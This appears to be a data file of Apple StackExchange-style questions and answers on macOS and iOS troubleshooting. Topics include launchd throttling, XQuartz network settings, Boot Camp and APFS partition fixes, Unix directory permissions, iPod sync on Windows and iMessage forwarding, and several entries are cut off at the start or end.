<string>PATH_TO_EXECUTABLE</string>\n\n</dict>\n</plist>\n\nUpdate: \nI figured out a work around for this problem. Rather than pointing to the executable, we can use open and supply a path to the app file. I haven't figured out what the difference is between launching the executable directly, but it seems to remediate the problem.\nHere is an example:\n<key>ProgramArguments</key>\n  <array>\n  <string>/usr/bin/open</string>\n  <string>-W</string>\n  <string>/Applications/Safari.app</string>\n</array>\n\n\nA: I had the same issue and it was solved by adding the ProcessType tag. \n    <key>ProcessType</key>\n    <string>Interactive</string>\n\nI had been looking at this issue from all kinds of angles comparing cpu/gpu usage, attributed system resources etc (as you must have as well) and it just wasn't apparent WHAT THE DIFFERENCE was, ie why the performance hit. In the man page it states: \n\nThis optional key describes, at a high level, the intended purpose of the\n       job.  The system will apply resource limits based on what kind of job it\n       is. If left unspecified, the system will apply light resource limits to\n       the job, throttling its CPU usage and I/O bandwidth.\n\nYou must have experienced as well that this throttling wasn't extremely apparent when looking at the process' properties.\nI got this solution when I emailed the excellent folks of launchd.info about this, hooray for them. Hope this helps you.\n", "Q: XQuartz: Enable ‘Allow connections from network clients’ via command line I'd like to write a shell script that uses xquartz.\nSpecifically the ‘Allow connections from network clients’ checkbox at Settings/Security has to be checked.

After some investigation I've figured out that the plist filename is a bit different in my system. So the command that ultimately worked for me is:\ndefaults write org.xquartz.X11.plist nolisten_tcp -bool false\n\nNote that macosforge has been shutdown and projects moved to other places - so removing macosforge from the default name makes sense.\n\nA: Xquartz settings are stored in ~/Library/Preferences/org.macosforge.xquartz.X11.plist, the key you are looking for is nolisten_tcp. \nTo allow connections from network clients use\ndefaults write org.macosforge.xquartz.X11.plist nolisten_tcp 0\n\nTo prevent connections use\ndefaults write org.macosforge.xquartz.X11.plist nolisten_tcp 1\n\nFor both cases Xquartz must not be running while you apply the change.\nPS: To look at the content of the file you can use\nplutil -p ~/Library/Preferences/org.macosforge.xquartz.X11.plist \n\n\nA: XQuartz settings or preferences are managed from the file\n~/Library/Preferences/org.macosforge.xquartz.X11.plist\nand are managed by XQuartz to read and write them through the\nagent com.apple.cfprefsd.xpc.agent.\nThe undocumented clean way I found to manage this file is:\n\n*\n\n*Quit XQuartz\n\n\n*Stop com.apple.cfprefsd.xpc.agent:\nlaunchctl stop com.apple.cfprefsd.xpc.agent\n\n\n\n*Make a local copy of ~/Library/Preferences/org.macosforge.xquartz.X11.plist\nmkdir src ; cd src\ncp ~/Library/Preferences/org.macosforge.xquartz.X11.plist .\nplutil -convert xml1 org.macosforge.xquartz.X11.plist\nvi org.macosforge.xquartz.X11.plist\n\njust before the last line containing:\n</dict>\n\ninsert:\n        <key>nolisten_tcp</key>\n        <false/>\n\nsave and exit vi.\n\n\n*Copy back this local copy on the original file:\ncp org.macosforge.xquartz.X11.plist ~/Library/Preferences\n\n\n\n*Restart com.apple.cfprefsd.xpc.agent:\nlaunchctl start com.apple.cfprefsd.xpc.agent\n\n\n\n*Restart XQuartz\nSince I wanted to make editing of this preference file as easy as possible, I made a Makefile of the process.

I'm trying to understand how Spotlight indexing works - in the documentation here, Apple says that the kernel notifies the Spotlight engine which then attempts to update the metadata store. If this is the case, why does it have to index - presumably it would be up to date if this already happens after every file event?\n\nA: Initially, the indexers have to process the entire disk so there are hours (days) to take one pass to index all files. \nSteady, state the kernel and system indexes all files as they are written so newly created files and files copied in are basically indexed real time. \nYou can see this in action by having spotlight in finder search a nonsense string that doesn’t exist. Then open text edit and past that string into a file and save it to your desktop - watching the finder window update to show that file. \n", "Q: App Store download progress doesn't go away after successful download Even after I successfully download any apps from App Store, the progress of that download doesn't go away from dock.\n\nHow can I fix it? \nThe problem is on macOS High Sierra, 10.13.4.\n\nA: *\n\n*Restart the Dock by executing: killall Dock.\n\n*Reset NVRAM.\n\n*Reset SMC.\nResetting NVRAM clears the cache which generally causes the issue.\n\nA: You can restart your Mac, Force Quit or delete Applications and restore the folder.

I find this annoying and unintuitive specially when I have already set a default downloads location. \nSay the last time I uploaded something it was a pdf for a university assignment and as a result the next time I save something it'll go to that same folder unless I'm careful enough to chose otherwise. Depending on what I save, the results could be catastrophic if I'm to upload that entire folder again (which I was actually on a couple occasions and thanks god I checked the contents before doing so).\nI have Safari 11.0.3 on macOS 10.13.3.\nAny way to change this behavior?\n\nA: I can think of three possibilities:\n\n\n*\n\n*One option that will definitely do this is to use Default Folder X1. It's not free, but you can use it for free for 30 days. Depending on the version you download, it's compatible with versions of macOS from Snow Leopard to High Sierra.\nDefault Folder X does a lot more than just setting the default \"Save\" location of individual applications.\n\n*As for a native macOS solution, I seem to recall a bit of a trick users could do that involves creating a smart folder and then adding it to the Sidebar. The idea was that you then navigated to that folder (via the Sidebar) when you next uploaded a file via Safari. Safari would then remember that location when saving files in future, regardless of where you subsequently uploaded files from. However, this is an old trick from about ten years ago and I couldn't vouch for it's validity now.\n\n*One possible workaround for you, assuming you're wanting to use the Downloads folder as the default Save location, is to just remember to use the optioncommandL shortcut when the Save As dialog window pops up. This shortcut takes you straight to the Downloads folder within the dialog box.\n\n\n1.

While you are in the second user, check that your backup is current or set one up and let it finish. Once you’re sure it’s not the system, you can decide to start cleaning your preferences for your user or erase your user and restore files manually or with Migration Assistant to bring your user back from the backup.  \nI would try an erase install and restore from backup first before troubleshooting user preferences or manual restore of files. That’s much quicker and I have good success with it cleanuping up preference rot (assuming that’s what is causing this). The bonus to this is it also clears up system corruption. Two birds, one stone, so to speak. \nAlso, delete any apps you don’t need or can easily reinstall - the app data is left around and the fewer items to triage, the faster you will narrow down what’s causing this. \n\n\n*Good luck!\n\n\n\nSome shots in the dark:\n- uninstall Chrome for a while\n- older versions of Microsoft Remote Desktop were reported to cause this - that should be easy to isolate if so\nThis is something quite a few have reported and my hunch is Apple probably doesn’t run the setup and app usage in their testing labs that’s likely to reproduce and fix this. Clearly this is a pretty severe visual bug triggered with some amount of common tasks. \n\nA: If logging out (cmd ⌘+shift ⇧+Q) - logging back, doesn't fix this graphical bug, I suggest you to run a complete hardware test:\nSupport Apple: Apple Hardware Test\n", "Q: How can I make bootable macOS High Sierra without the HighSierra App from App Store I have downloaded a genuine copy of macOS High Sierra from a website and after I opened it I can see many part files (like part 1, part 2 ...).

You can use The Unarchiver from the Mac App Store to extract the installer from the archive. Be sure to select part1 when extracting. Also remember, downloading macOS from 3rd party websites might be dangerous as they might be modified.\n\nA: To answer the question in your title. You can create a bootable MacOS High Sierra disk without downloading it from the Apple store.\nUsing your Apple ID, create a free developer account and download the installer from https://developer.apple.com/download/ \nI certainly would not be installing a copy of macOS that wasn't downloaded from Apple\n", "Q: How to set the style in text string of MS Word via AppleScript? I would like to find a way to change the style to heading1 of a particular text string that I'm adding in an MS Word document using Applescript, but after hours of searching, and looking at the dictionary, I can't find a way to to it. Something like this:\n    tell application \"Microsoft Word\"\n    activate\n    tell active document\n        set ContTemp to content of text object\n        set StartRange to (count of ContTemp) - 1\n        set endrange to StartRange\n        set theRange to create range start StartRange end endrange\n        set style of format of theRange to style heading1\n        set content of theRange to StringVar\n    end tell\nend tell\n\nBut it generates an error at \"set style of format of theRange. . . \". Removing that single lines works to add the text StringVar (a simple text string) into the Word document. But I can't style it, and I need to have it set to heading1.\nThanks for the help!!\n\nA: If you open the Microsoft Word dictionary in Script Editor you will see that a range does not have an attribute format, only an attribute style so the correct line is set style of theRange to style heading1.\nAfter that your code complains that StringVar is not defined so I assume you are setting it before the code you have given us. \n", "Q: Increasing main APFS volume's size Yesterday I tried installing Windows using Bootcamp but as usual, it didn't go well after partitioning. BC Assistant wasn't able to remove its partitions either. So after reading around, I managed to format the 50 GB that I allocated to BC into FAT32 and then into APFS and I tried to increase the main APFS volume (that has macOS and every thing) using (I used the correct disk identifiers, not those names mentioned below) \ndiskutil apfs deleteContainer disk0s3\ndiskutil eraseVolume free n disk0s3\ndiskutil apfs resizeContainer disk0s2 0\n\nHowever it seems like my main volume's size didn't increase and the 50GB are no where to be found. Here's my latest diskutil list and also note that BC Assistant won't fix anything on its own.\n\nPS: What's wrong with BootCamp Assistant? It always never work without issues. First attempt it failed at partitioning, second attempt it partitioned and then it failed and tried rewinding but then it failed again. Is there a way to fix it without having to reset all my Mac?\n\nA: There is nothing wrong with the Boot Camp Assistant. The problem is with the use of APFS. If the APFS configuration is not precisely correct, then the Boot Camp Assistant fails. Eventually, your macOS installation can boot and preform correctly without you knowing there is a problem with the APFS configuration. In such cases, problems first appear when trying to repartition using the Disk Utility, Boot Camp Assistant or the command line.\nThe stock solution is to backup using Time Machine, then reinstall everything from scratch. The result is a clean system where the Boot Camp Assistant correctly installs Windows on your Mac.\nAn alternate solution would be to use the Boot Camp Assistant to only download the Boot Camp Support Software (Windows Helper Software). You then would install Windows using a USB flash drive. An example of such a procedure is outlined in the accepted answer to the question \"Can I install Win 10 (GPT formatted USB installer) on MacBook Pro without using BootCamp?\". In your case, you have already allocated space for Windows. I would recommend modifying step 7.1 to include deleting the OSXRESERVED partition, then using the remaining free space for the Windows installation.\nIf you want to forgo a Windows installation, them the following commands should recover the lost space.\ndiskutil eraseVolume free n disk0s3\ndiskutil apfs resizeContainer disk0s2 0\n\nIf the above commands fail to work, then you will need to boot to Recovery Mode and enter the following commands. These commands will not alter your computer. The commands just shows the internal partition table values. Post the results to your question.\nsudo fdisk /dev/disk0\nsudo gpt -r show /dev/disk0\n\n", "Q: Understanding directory permissions in UNIX I've been trying to learn Unix and Terminal a bit better, and I've come across some behavior I don't understand. Hoping someone can explain to me what I'm missing.\nLately I've been experimenting with permissions on directories. From what I (thought) I understood, read permission means you can view the contents of a directory (i.e., ls directory should list the contents of the directory); write permission means you can create, modify, or delete files in the directory (i.e., touch directory/newfile, or vi directory/fileimade, or rm directory/fileihate, all should work); and execute permission means you can make the directory your working directory (i.e., cd directory should work)\nBut that isn't what I'm finding.\nIf I have r-- on a directory, I receive errors on attempting cd directory or touch directory/newfile, as expected. But if I run ls directory -- well, I don't get an error, but no files are listed, even if I know there are files that I own and/or have rights to within the directory. So, ls has run successfully but with no data to standard output. Why not?\nIf I have -w- on a directory, I receive errors on cd and ls, as expected. But if I try to create a new file - touch directory/newfile - I also get an error. Why?\nAll of the x categories work exactly as expected; I can cd into directories with --x, but nothing else. I can cd into directories with -wx, create and delete files, but ls returns an error. And I can cd into r-x directories, list their contents, and work on files for which I have existing permissions, but cannot create or delete files. All these make sense to me.\nSo what am I not understanding correctly about r-- and -w-?\n\nA: \nIf I have r-- on a directory, I receive errors on attempting cd directory or touch directory/newfile, as expected. But if I run ls directory -- well, I don't get an error, but no files are listed, even if I know there are files that I own and/or have rights to within the directory. So, ls has run successfully but with no data to standard output. Why not?\n\nIf you just ls directory then the \"files\" inside directory should list but if you use ls -l which calls stat(2) the operation will silently fail as stat requires a full searchable path to the filesystem object.\n\nIf I have -w- on a directory, I receive errors on cd and ls, as expected. But if I try to create a new file - touch directory/newfile - I also get an error. Why?\n\nOnce again touch calls open(2) system call which requires a full searchable path (all directories in the path are executable/searchable) or the operation will fail.\n\nA: You have a fair idea about the UNIX file and directory permissions, which is good for a start.\nThere are three type of permissions\n\n\n*\n\n*r: read permission\n\n*w: write permission\n\n*x: execute permission\nfor three categories of ownerships\n\n\n*\n\n*u: user or the owner\n\n*g: group owner\n\n*o: others or everyone else\nBroadly speaking, there are two kind of entities in UNIX file system:\n\n\n*\n\n*files\n\n*directories\nOn a technical level a directory is nothing but a special kind of file, simply containing a list of files and directories contained within it.\nNow, let's clearly lay out what does the three permission (read, write, execute) type mean for a directory. Assume that the logged in user in question is the owner of the directory (to keep things simple)\n\n\n*\n\n*read: The directory (technically the directory file), can be read, i.e. the directory contents can be listed for e.g. using the ls command.\n\n*write: The directory (technically the directory file), can be written. This means that a new file/sub-directory can be created and deleted by using commands like touch, vim, cp etc.\n\n*execute: The directory (technically the directory file), can be executed. This simply means that the owner can change to this directory, i.e. cd into the directory.\nNow carefully think about each one of the above discussed permissions independently. Here are the various possibilities of permissions and what the owner can do in each case:\n\n\n*\n\n*- - -: No permissions. The directory is practically useless.\n\n*- - x: Owner can change into the directory, but can neither create/delete file/directory into it, nor can she list directory contents.\n\n*- w -: Owner can create/delete file/directory inside this directory, but can neither list its contents, nor can she change into it.\n\n*- w x: Owner can create/delete file/directory inside this directory, change into it, but cannot list its contents. \n\n*r - -: Owner can only list directory contents.\n\n*r - x: Owner can not create/delete file/directory inside this directory.\n\n*r w -: Owner cannot change into this directory.\n\n*r w x: Owner can perform all three actions in the directory.\nNow this should help in getting a clear-cut understanding of what actions are possible with which directory permissions.\nOnce the above concepts make sense to you, let's go through your problem statements again:\n\nFrom what I (thought) I understood, read permission means you can view the contents of a directory (i.e., ls directory should list the contents of the directory);\n\nThis is absolutely correct and should be obvious from the discussion above.\n\nwrite permission means you can create, modify, or delete files in the directory (i.e., touch directory/newfile, or vi directory/fileimade, or rm directory/fileihate, all should work);\n\nPartially correct. With write permission available in the directory, you can write the directory file, this means adding and deleting content to the directory file. (This should be clear by now but I will re-iterate, a directory is simply a file, although special one, which simply stores a list of all the contained files and sub-directories.) This means you can create and delete files (or directories) in the directory but cannot modify files unless you have write permission available on the file. You can delete a file where you don't have read or write permission, since you have write permission available for the containing directory. touch directory/newfile, or vi directory/fileimade, or rm directory/fileihate, all should work fine.\n\nand execute permission means you can make the directory your working directory (i.e., cd directory should work)\n\nAbsolutely correct.\n\nIf I have r-- on a directory, I receive errors on attempting cd directory or touch directory/newfile, as expected. But if I run ls directory -- well, I don't get an error, but no files are listed, even if I know there are files that I own and/or have rights to within the directory. So, ls has run successfully but with no data to standard output. Why not?\n\nYou are right. The case where no output is shown occurs when the directory is completely empty. If you have read permission on a directory, the contents should get listed irrespective of permission on files/sub-directories. Another possibility is that the files and directories are hidden. Try running ls -a directory. You can re-check to make sure that you have read permission on the directory by running ls -ld directory. Also check the output of alias ls.\n\nIf I have -w- on a directory, I receive errors on cd and ls, as expected. But if I try to create a new file - touch directory/newfile - I also get an error. Why?\n\nYou should be able to create a file, unless no other file/directory of same name exists already. What is the error that you get?\n\nAll of the x categories work exactly as expected; I can cd into directories with --x, but nothing else. I can cd into directories with -wx, create and delete files, but ls returns an error. And I can cd into r-x directories, list their contents, and work on files for which I have existing permissions, but cannot create or delete files. All these make sense to me.\nSo what am I not understanding correctly about r-- and -w-?\n\nPlease go through the discussion above once more and see if that helps.\n", "Q: With \"Optimise iPhone Storage\" mode, is it possible to tell iPhone to keep some photos/videos always locally available?

What now happens when I don't have access to internet is that I can't play videos at all (ones that have already been uploaded to iCloud). \nEspecially when travelling where roaming is prohibitively expensive and most of the time I'm without internet, it would be very useful to be able to select some files to be available offline. \nOne thing I tried is favouriting a video, but that doesn't affect this.

If you’d like to send feedback to Apple, you can use www.apple.com/feedback\nPersonally, I’ve worked around with this limitation a few times by viewing photos I want ahead of time.

I don't have any other option than booting externally until I get this fixed which might take a week or so.\nWill this have a bad impact on my hard drive?. What are the things that i should worry about other than loose connections?\n\nA: If I understand you correctly, you have removed the internal hard drive from you MacBook Pro and inserted it into an external caddy. When used like this, the performance of the hard drive is much better. It sounds like the internal SATA cable is damaged.\nThere should be no issue with using an external bootable disk. While typically the performance of an external connection is slower than using an internal connection, your case is an exception.\nAs you said, keep the connection to the disk secure. If the disk is disconnected before shutting down, it could lead to file corruption, volume corruption, or other data loss. \nTo make sure it finds the disk easily during boot, I’d recommend:\n\n  \n*\n  \n*Connect the external disk before powering on the Mac arch time.\n  \n*Select the external disk as the default boot volume in System Preferences > Start Up Disk (you may need to unlock the padlock before you can select th disk).\n  \n\nFinally, I would recommend contacting Apple Support. If covered by warenty, AppleCare, or Consumer Law, service may be free. Also, if a repair program is available for this issue, it could also cover the cost of repair.\n", "Q: How to create exFAT or NTFS RAID 1 I am looking for a way to create a RAID 1 Volume from macOS Sierra with a format that will be readable from both Mac and Linux.\nUsing DiskUtility I can not seem to find a way to format the RAID in another other formats other than JHFS+. Even from the command line. Maybe I am wrong and just have not found how to do it. Please let me know if I have missed it.\nOther things I have considered is spinning up a virtual machine and/or Docker container and just doing it from Linux this way. Because I know how I can do it from mdadm.\nI have also looked around for some third party software that can do this, but most of the ones that I have found are more than I'm willing to pay, since I know I can do it inside of Linux for free.\nLastly, I am trying to use luks to encrypt the RAID after it is set up. I am not sure any answers would prevent this, but just thought I would mention it in case it impacts the answers. \n\nA: I created a RAID set using two USB sticks with Disk Utility in macOS Sierra 10.12.6. While I was only presented with Mac OS Extended options during the setup, once the RAID set was created I could erase it and choose another format.\n\nAfter formatting the volume as ExFAT, I was able to store data on the RAID set.\nHowever, I can't say what standard of RAID is used creating these sets. If you intend to connect the RAID set to another OS other than macOS, your millage may vary.\n", "Q: iPod Classic can't be seen by iTunes 12.7 on Windows 10 I have a used iPod Classic 5th Generation (A1136) that was purchased for a parent as it is compatible with all their 40-pin gear. One of the parents already has an identical model which was \"working fine\" (although hadn't been synced for over a year). By this I understand that syncing has worked on their family PC (running Windows 10) in the past, but updates may have been run / fiddling may have taken place since the last successful sync.\nHowever, I plugged in this newly purchased iPod to the family PC (via USB) and strange things began to happen. The iPod appeared to connect, then disconnect and reconnect again in a loop until eventually Windows gave up and said the device had malfunctioned. iTunes doesn't detect the device at all, but once the connect/reconnect loop gives up the iPod appears as a mass storage device - but iTunes continues to ignore it.\nThings I have tried\n\n\n*\n\n*different computer - tried it on another Windows 10 machine with an identical version of iTunes (12.7.4.76) - works flawlessly (with the same sync cable)\n\n*different USB port on the same computer - all behave identically\n\n*uninstall iTunes, reboot, reinstall iTunes, reboot - same behaviour\n\n*reinstall Apple Mobile Device Support driver (usbaapl64.inf) - same behaviour\n\n\nHonestly, I'm tearing my hair out. Short of a clean Windows 10 install I don't know what else to do. Any ideas?\n\nA: I spoke with Apple Support. The iPod Classic is no longer supported by the software, period. Backwards compatibility is not considered and old versions of iTunes are not provided by Apple. In fact, the support personnel are forbidden to provide an older version. They suggest buying a new iPod.\n\nA: The older iPods are no longer supported by the new iTunes 12.9. To get the iPod back on track, it's best to install an old version of iTunes on a Windows PC. To get the older versions of iTunes, search in Google.\n\nA: I had this problem and tried everything from all kinds of forums and posts.  Although my iPod was registered and visible on one of my computers, it was invisible and did not appear in iTunes on another until I assigned a drive letter to it in: Control Panel\\Administrative Tools\\Computer Management\\Disk Management - and suddenly there it was!\n\nA: I feel your pain! I have an iPod Classic 160GB that is suffering the same issue on my Windows 10 PC and tablet as of a couple of weeks ago. However, my iPhone 8 is working perfectly.\nLike you, I have followed all the suggestions I can find on the web, including restoring my PC from a month ago and then installing an older version of iTunes with no luck.\nWindows currently recognizes the iPod as a USB disk, even when I switch it out of disk mode. When I go through Device Manager to update the driver under Portable Devices to install the same driver as the iPhone is using, it tells me that it is not a valid driver for that hardware. So Windows PnP does not recognize it as a iPod, which is a software issue? So why didn't the recovery work?\nI have run all sorts of diagnostics on the iPod with no issues. I have reached the stage where it realizes that it is corrupt, and even tells me to restore it using iTunes, but if Windows doesn't recognize it... I have noticed that Windows hangs when it is attached, and I have had timeouts on the driver install.\nI'm planning to go into my local Apple store next week, but I wonder if even their Geniuses understand Windows drivers and PnP. I also plan to hammer it this weekend, since it should be a user solution. I will post any updates.\nSlight update: OK, so Windows 10 PnP returns a Device Identification String which it matches to a device in the \"Models\" section of the INF file. So these must not match! Now the INF file is from the latest Apple drivers, so is the iPod screwed enough to be returning a DIS that matches to a USB device but not an iPod? Going to look at resertting the iPod a few more times.\n\nA: I did take the cable and ipod to a friend with a Mac and got nowhere.\nHowever, I went to my local Apple store on the way home. They attached to one of their laptop and iTunes recognized it almost immediately as needing recovery. When it was done, I connected it to my tablet, where iTunes recognized it as an Apple formatted iPod and allowed me to reformat and populate.\nThe problem appeared to be corrupted firmware returning a string to PnP that was not recognized. You need to connect it to a Mac, and good luck!\nThank you and goodbye!\n\nA: I have a newish Win 10 64 bit that has never had iTunes on it. I downloaded iTunes 9.2.1, ran setup and plugged in the iPod. I got an error message telling me to unplug it and then plug it back in. I did and it worked. I've put 1 new song onto the iPod so far and it worked just fine. Here's a link to the page for 9.2.1:  https://support.apple.com/kb/DL1056?locale=en_US\n\nA: Something strange is going on... I have a 5th gen iPod, now called classic (no such tag when purchased), 80 GB, software version 1.1.2 and it works fine with iTunes version 12.10.1.4 running on Windows 10 Home 64-bit version 1903 OS build 18362.418, and has never stopped working through all the iTunes and Windows upgrades/changes since iPod was bought more than a decade ago. Since the original question states that it worked flawlessly on another computer, it makes me think there may be a software version issue; make sure your CPU, OS, and iTunes are all either 32-bit or all 64-bit. While 64-bit CPUs can use 32-bit OS & software, things tend to work better when they all are 64-bit, and 32-bit CPU can only use 32-bit OS and software. If that is all good, try different USB ports & cables, since both go bad.\n\nA: Using a 3rd part music manager is the only thing that is really going to help. iPod classic support is killed off in recent iTunes on mac and win so you need a 3rd party app to do so, unless you're still running a few versions back iTunes app. I use \"transpod\" to add and delete music that gets me by.\n\nA: Take the device and cable to another iTunes and you'll know very quickly if the device or cable is flakey or you need to dig into the computer as the cause of the instability.\nOn windows, dozens of things need to line up for iPods and iPhones and iPads to work with iTunes so you would need to be very systematic and work through all those things:\n\n\n*\n\n*https://discussions.apple.com/docs/DOC-6562 - 280 thousand views on this amazing document on troubleshooting iTunes on windows.\n\n*https://support.apple.com/en-us/HT204095 - Apple's official troubleshooting checklist for windows iTunes not recognizing a device\n\n\nGood luck and once you have a repeatable error condition in iTunes, please ask a follow on question with those specific and repeatable errors for more help.\n\nA: I have received this link where you can find all the old version from iTunes. \nhttp://www.oldversion.com/windows/itunes/\nI have the same problem as you mentioned, but without a solution at the moment.

I remember having used this feature for a while with both iOS 10 and iOS 11 on my iPhone. However, when I try to enable it now, I can no longer see the option available under Settings app → Messages (I'm running iOS 11.3). It used to be available previously. I have only one Apple ID which I use for everything. I am logged in with it on both my MacBook Pro and my iPhone.\nIs this feature removed in iOS 11.3? I remember using it after upgrading to iOS 11. I don't recall this option requiring some other setting to be enabled in iPhone. Here's the screenshot from the Messages setting. The Text Message Forwarding option is clearly missing:\n\nHow do I resolve this issue? As I compare the screenshot from my iPhone with the one provided in the Apple knowledge base article, it appears that Show Contact Photos toggle is missing too. Are these official/documented changes in the Messages app?\n\nA: Turn off iMessage on your Mac by going to Messages → Preferences → Accounts → Enable this account and turn it on again.\nNow restart your iPhone and the option will show up.\n\nA: To add to the other answers… Another reason Text Message Forwarding may not show up, is that you simply need to activate your Apple ID email address for use with iMessage. Even if it was enabled previously, it's worth checking this again, because it's a very simple fix if this is all it is.\n\n\n*\n\n*Open Settings > Messages > Send & Receive.\n\n*If your Apple ID email address is not listed, look for a button that says 'Use your Apple ID for iMessage' and tap it.\n\n*When your email address appears, confirm that it is checked.\n\n*Confirm that the 'Text Message Forwarding' option is now visible. If not, refresh the screen by going back to the main Settings screen, and then back into Settings > Messages.\n\n*At this stage, your other devices may ask you if you want to use your phone number in Messages. If not, activate them under Settings > Messages > Text Message Forwarding.\n\n\nA: For iPad users, I was able to make text forwarding re-appear by checking off my phone number in iMessage.\n\n\n*\n\n*On your iPad, open Settings -> Messages -> Send & Recieve.\n\n*Make sure your phone number is checked.\n\n*Reboot your iPhone\n\n\nThe message forwarding option should now be available\nCredit to HankAZ and lv1 on iMore’s forums for this method.\n\nA: I finally found the reason MY new iPhone Xr did not show Call Forwarding after I had to do a reset all settings for a different issue:\nhttps://support.apple.com/en-us/HT209456\nEach device is signed in to iCloud with the same Apple ID.\nEach device is signed in to FaceTime with the same Apple ID.\nEach device has Wi-Fi turned on.\nEach device is connected to the same network using Wi-Fi or Ethernet.\nOn your iPhone, go to Settings > Phone > Calls on Other Devices, then turn on Allow Calls on Other Devices.\nOn your iPad or iPod touch, go to Settings > FaceTime, then turn on Calls from iPhone.\nOn your Mac, open the FaceTime app, then choose FaceTime > Preferences.

I'm testing some scripts which are destined for use inside various GUI Apps, either as direct shell calls or as part of an AppleScript do shell script call.  I know from experience that the shell which an App gets is nothing like what I get by default when starting Terminal, so I'd like to figure out a way to simulate the shell that an App gets so that I can debug the scripts knowing that they are behaving as I should expect them to behave in their final expected use environment.\nSo, how to I open an Terminal (or modify one which is already open) so that it behaves like the shell that a GUI App has access to?\n\nA: First, let me solve the problem of a GUI app not providing the same environment as a terminal session to a bash script.\nThe differences are because of your bash profile, so you can have exactly the same in a GUI shell script by using the source command. Put the line source /Users/<username>/.bash_profile (replacing <username> with your short name) at the top of your bash script and you will have the same environment in the script when run inside a GUI app as in your shell session.\nTo get a shell without running your profile in iTerm2 (I couldn't get it to work in Terrminal):\n\n\n*\n\n*Open to Terminal->Preferences\n\n*Go to the Profiles pane\n\n*Duplicate your default profile\n\n*In \"General\"\n\n*Change the name of the new profile to \"No Profile\"\n\n*Set the shortcut key to Control-Command-A\n\n*Click on \"Command\"\n\n*Set the command to /bin/bash -norc\n\n*Close the Preferences\n\n\nNow Control-Command-A will open a session exactly the same as a GUI app would get - everything set to the bash default.\n", "Q: Captioning an image in Keynote Guides online refer to a text box beneath the image, but I don't see one in Keynote 8. I've filled in the Description, but I can't find any way to make that visible, either. Must I create a text box? I am using my company's presentation template.\n\nA: The Description field attached to an image is not designed to be visible in your presentation. Instead, the purpose of the Description field is to provide additional information that can be read by assistive software. This allows users of any such software to access your presentation in a meaningful way.\nAssistive software is primarily used by people who face challenges (e.g. visual impairment, learning difficulties, etc) so that they're able to access content that would otherwise not be available to them. For example, a description you enter for an image in Keynote can be read out aloud using VoiceOver so that a user with visual impairment is aware of it and understands it.\nA text box is totally separate to an image and would need to be added individually. Depending on what you wanted to achieve, you could use a text box, comments or notes. If all you wanted, however, was a caption at the bottom of images then a text box is probably your best bet.\n", "Q: Boot Camp Assistant Install Fails to install Windows 10 1709. \"An error occurred while copying the Windows installation files.\" I'm trying to do a first-time install of Windows 10 1709 with Boot Camp Assistant.

I also wrote up an explanation. It is related max file size of FAT32 and how Boot Camp Assistant prepares the installation.\nhttps://twocanoes.com/using-larger-windows-10-isos-with-boot-camp-assistant/\n\nA: If you are trying to create a bootable USB using Bootcamp Assistant and then if you get \"could not create bootable or error copying Windows file\" then it should be that you have MOUNTED the ISO image in Desktop... Unmount it and the error won't appear. This is the method which worked for me after getting the error.\n\nA: \nNote: This answer is being posted appropriately 4 years after the above question was asked. Therefore, this answer is more focused on users with a similar question and have more newer versions of macOS available, but desire to continue to use an older version of macOS.\n\nOption 1\nIf newer versions of macOS are available, then one option would be to erase the Mac and install the latest version of macOS available for your Mac. Next, download the latest release of Windows 10. Use the Boot Camp Assistant to install Windows 10. Finally, erase your current macOS and install the desired older version of macOS. If erasing your current macOS is not a viable option or this procedure fails to work, then try the next option.\nOption 2\nUse the Boot Camp Assistant to install a version of Windows 10 released about the same as your current macOS. Wikipedia has the release dates for macOS and Windows 10. From Windows, download the current Windows 10 release and use the download to upgrade Windows 10.\nRufus can be used to download older Windows 10 releases. You will need Windows 7 or later in order to run Rufus. If a machine with Windows installed is not available to run Rufus, then you could temporarily install the current Windows 10 in a virtual machine. A temporary installation of Windows 10 in a virtual machine does not require a product key. Both Oracle VirtualBox and VMware Fusion are free virtual machine products. If the current virtual machine software is not compatible with your current macOS, then try installing an older version of the virtual machine software. Once you have acquired the desired Windows 10 ISO, you can delete the Windows 10 virtual machine.\n\nA: Is your hard drive healthy ?\nYou can check some usefull software here.\nOtherwise it seems it could also be your Windows installation files that are corrupted.\nDo you use a DVD, or an ISO on USB KEY created in bootcamp ?\nCan you try to format / re-create the USB KEY if so ?\n\nA: It may be that your internet connection is struggling with the download, and that this software https://github.com/timsutton/brigadier from @timsutton or else this question How to download Bootcamp drivers without Bootcamp assistant? gets you further?\n\nA: I was able to solve this by using an older release of Windows 10. 1803 wouldn't work and I found a reference to using 1703 due to a FAT32 size issue. My initial attempts to get 1703 working also failed until I realized 1703 July 2017 update was larger (5.1 GB) than the original 1703 release (4.0 GB). Since the issue revolved around the 4 GB limit of FAT32, I tried the original 1703 version and was successful.\nBetween steps I reset the BootCamp Assistant efforts by rebooting, opening Disk Utility, and deleting the BOOTCAMP partition.\n\nA: All you guys need to do is very simple ..windows 10 file when you download from microsoft its 5.8 or 5.9 gb but when bootcamp is going to format the disk its automatically making separate file of less then 1 point from the actual file that's why error massage comes back saying unable to fit in the usb or what so ever disk \ndon't waist your time on formatting the disc again and again, hope answered the Question to solve the problem all i did is i downloaded from other site where the file was 4.22 gb and the work is done and i am using mu windows daily ,good luck \n", "Q: Alert sounds on iMac Just got a new iMac and it is making an alert type beep every 30 secs.

Typically, it'll refer to the date and time the photo or screenshot was originally saved (i.e. originally taken).\nObviously I can't comment on the photo in your question, but my guess is that the time of 3:29pm and date of 23 March 2005 is what's in the metadata of the photo, and that it was originally taken by a digital camera of some sort at that time (obviously not with your iPhone).\nAny photo taken with an iPhone (or any digital camera) will actually also store a whole heap of metadata. In addition to the date and time it was taken, it can capture the colour mode, size in pixels, depth, and so much more. When you then edit that photo with your iPhone (or digital camera) it'll also capture the date and time it was modified.\nHowever, in the Photos app of your iPhone the metadata it'll display is the date and time the you took the photo (or the data and time it was originally taken by whichever digital camera it was). \nEditing the photo doesn't change the metadata being displayed, not even if you opt to use the Copy or Duplicate options.\n", "Q: How to Disassociate an Apple ID from a work computer How do I disassociate an Apple-ID from an iMac? I am trying to push updates on a work computer but I can not. I am unable to because a previous employee's apple ID pops up and I do not have the password. Does anyone have any suggestions?\n\nA: Simply put, you can't without the Apple ID info of the original owner/user. \nHowever, there is a workaround. If you reinstall the original OSX associated with the machine using Internet Recovery, this will enable you to sign in using your Apple ID and subsequently upgrade the OS from there. Note that this will not work using the simple recovery mode (the partition already on the disk).\nAlthough reinstallation is non-destructive, it's always a good idea to back up beforehand. \n\nA: There are a number of ways a Mac might be linked to a particular Apple ID, and how you disassociate it depends on how ir's linked. Installing system updates shouldn't require any Apple ID. Are 